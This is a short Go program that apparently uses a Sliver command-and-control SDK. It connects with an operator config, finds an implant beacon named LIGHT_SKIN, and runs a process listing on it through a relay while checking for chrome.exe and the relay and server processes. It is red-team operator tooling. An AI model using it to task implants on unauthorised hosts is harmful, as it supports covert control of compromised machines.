package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/vite-ui/sliver-sdk/sliverapi"
)

func main() {
	cfgPath := flag.String("config", "", "operator .cfg path")
	flag.Parse()

	client, err := sliverapi.Connect(*cfgPath)
	if err != nil {
		log.Fatal(err)
	}
	defer client.Close()

	beacon, err := client.Beacon("LIGHT_SKIN")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("Found LIGHT_SKIN: %s pid=%d\n", beacon.ID[:8], beacon.PID)

	fmt.Println("Running Ps on LIGHT_SKIN via relay (waiting for beacon check-in)...")
	ps, err := client.PsBeacon(beacon)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("SUCCESS: %d processes via relay!\n", len(ps.Processes))

	chrome := ps.FindByName("chrome.exe")
	if chrome != nil {
		fmt.Printf("Found chrome.exe PID %d\n", chrome.Pid)
	}
	sliver := ps.FindByName("sliver-server.exe")
	if sliver != nil {
		fmt.Printf("Found sliver-server.exe PID %d\n", sliver.Pid)
	}
	relay := ps.FindByName("relay-beacon.exe")
	if relay != nil {
		fmt.Printf("Found relay-beacon.exe PID %d\n", relay.Pid)
	}
}
